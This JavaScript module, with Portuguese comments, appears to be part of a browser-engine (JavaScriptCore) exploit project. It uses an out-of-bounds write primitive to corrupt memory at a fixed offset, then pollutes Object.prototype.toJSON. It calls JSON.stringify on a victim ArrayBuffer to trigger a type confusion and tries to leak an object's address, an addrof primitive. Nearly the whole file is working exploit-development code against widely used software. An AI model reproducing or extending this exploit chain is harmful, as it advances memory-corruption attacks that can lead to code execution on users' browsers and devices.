// js/script3/testArrayBufferVictimCrash.mjs (Corrigido: import de isOOBReady e sem redeclaração de OOB_CONFIG)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs'; // Deve ser o v31 que expande m_length de oob_dataview_real
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // OOB_CONFIG é importado aqui.

// Certifique-se de que não há outra declaração de 'const OOB_CONFIG = ...' ou 'let OOB_CONFIG = ...' neste arquivo.
export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v1_Debug_SyntaxFix";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

let toJSON_call_details_v28 = null;
let victim_ab_ref_for_original_test = null;
let object_to_leak_for_addrof_attempt = null;

const CORRUPTION_TARGET_OFFSET_IN_OOB_AB_V28 = 0x7C;


function toJSON_V28_DebugProbe_With_AddrofAttempt() {
    toJSON_call_details_v28 = {
        probe_variant: "V28_DebugProbe_Addrof",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: false,
        heisenbug_active_at_write_attempt: false,
        internal_probe_write_read_match: null,
        error_in_probe_rw: null
    };

    try {
        toJSON_call_details_v28.probe_called = true;
        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
        logS3(`[toJSON_DebugProbe] Sonda chamada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "info");

        if (this === victim_ab_ref_for_original_test) {
            if (toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
                toJSON_call_details_v28.heisenbug_active_at_write_attempt = true;
                logS3(`[toJSON_DebugProbe] HEISENBUG ATIVA NO VICTIM_AB! Tentando escrever objeto alvo em this[0]...`, "vuln");

                if (object_to_leak_for_addrof_attempt) {
                    try {
                        this[0] = object_to_leak_for_addrof_attempt;
                        logS3(`[toJSON_DebugProbe] Escrita this[0] = object_to_leak realizada.`, "info");

                        const readBackValue = this[0];
                        logS3(`[toJSON_DebugProbe] Lido de volta de this[0] (dentro da sonda): ${typeof readBackValue === 'object' ? '{object}' : String(readBackValue)}`, "leak");

                        if (readBackValue === object_to_leak_for_addrof_attempt) {
                            toJSON_call_details_v28.internal_probe_write_read_match = true;
                            logS3(`[toJSON_DebugProbe] SUCESSO INTERNO DA SONDA: this[0] corresponde ao objeto vazado!`, "good");
                        } else {
                            toJSON_call_details_v28.internal_probe_write_read_match = false;
                            logS3(`[toJSON_DebugProbe] FALHA INTERNA DA SONDA: this[0] NÃO corresponde.`, "warn");
                        }
                    } catch (e_rw) {
                        toJSON_call_details_v28.error_in_probe_rw = `${e_rw.name}: ${e_rw.message}`;
                        logS3(`[toJSON_DebugProbe] ERRO ao tentar escrever/ler this[0]: ${e_rw.message}`, "error");
                    }
                } else {
                    logS3(`[toJSON_DebugProbe] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
                }
            } else {
                logS3(`[toJSON_DebugProbe] 'this' é victim_ab, mas Heisenbug NÃO ATIVA (tipo: ${toJSON_call_details_v28.this_type_in_toJSON}). Escrita não tentada.`, "info");
            }
        }
    } catch (e) {
        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[toJSON_DebugProbe] ERRO GERAL na sonda: ${e.name} - ${e.message}`, "error");
    }
    return { minimal_probe_executed_v28_debug: true };
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug Estável e Tentativa de Addrof (com Depuração) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    toJSON_call_details_v28 = { // Inicializar aqui para garantir que não seja null se a sonda não for chamada
        probe_variant: "V28_DebugProbe_Addrof_PreInit",
        this_type_in_toJSON: "N/A",
        error_in_toJSON: null,
        probe_called: false,
        heisenbug_active_at_write_attempt: false,
        internal_probe_write_read_match: null,
        error_in_probe_rw: null
    };
    victim_ab_ref_for_original_test = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_1202_Debug_SyntaxFix" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    
    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof (V28_Debug) não tentado ou Heisenbug não ocorreu conforme esperado."
    };
    
    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { 
            throw new Error("OOB Init falhou ou m_length de oob_dataview_real não foi expandido para 0xFFFFFFFF.");
        }
        logS3("Ambiente OOB inicializado e m_length de oob_dataview_real expandido.", "info", FNAME_CURRENT_TEST);
        logS3(`    Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(CORRUPTION_TARGET_OFFSET_IN_OOB_AB_V28)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(CORRUPTION_TARGET_OFFSET_IN_OOB_AB_V28)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(CORRUPTION_TARGET_OFFSET_IN_OOB_AB_V28, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(CORRUPTION_TARGET_OFFSET_IN_OOB_AB_V28)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(SHORT_PAUSE_S3); 

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        const fillPattern = Math.random();
        float64_view_on_victim.fill(fillPattern);

        logS3(`PASSO 2: victim_ab (tam ${VICTIM_AB_SIZE}) criado. View preenchida com ${fillPattern}. Tentando JSON.stringify com ${toJSON_V28_DebugProbe_With_AddrofAttempt.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_DebugProbe_With_AddrofAttempt,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_DebugProbe_With_AddrofAttempt.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            
            logS3(`  JSON.stringify completou. Resultado (da sonda stringify): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called && 
                toJSON_call_details_v28.this_type_in_toJSON === "[object Object]" &&
                toJSON_call_details_v28.heisenbug_active_at_write_attempt) {
                
                logS3(`  HEISENBUG ATIVA DURANTE TENTATIVA DE ESCRITA CONFIRMADA! Verificando buffer...`, "vuln", FNAME_CURRENT_TEST);
                
                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS Heisenbug...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_on_victim[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                (new Float64Array(double_buffer_for_conversion))[0] = value_read_as_double;
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && value_read_as_double !== fillPattern &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Heisenbug V28_Debug confirmada E leitura de double sugere um ponteiro.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Heisenbug V28_Debug ativa na escrita, mas valor lido não parece ponteiro ou buffer não foi alterado.";
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double}, Padrão: ${fillPattern})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                }
            } else {
                let msg = "Heisenbug (this como [object Object] ou tentativa de escrita) não foi confirmada via toJSON_call_details_v28.";
                if(toJSON_call_details_v28) msg += ` Tipo: ${toJSON_call_details_v28.this_type_in_toJSON}, Tentativa de Escrita com Heisenbug Ativa: ${toJSON_call_details_v28.heisenbug_active_at_write_attempt}`;
                addrof_result.message = msg;
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug/Escrita Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack && typeof e_outer_main.stack === 'string') logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}: ${e_outer_main.message}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof (Debug): Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
        toJSON_call_details_v28 = null;
    }
    return { 
        errorCapturedMain: errorCapturedMain, 
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result
    };
}
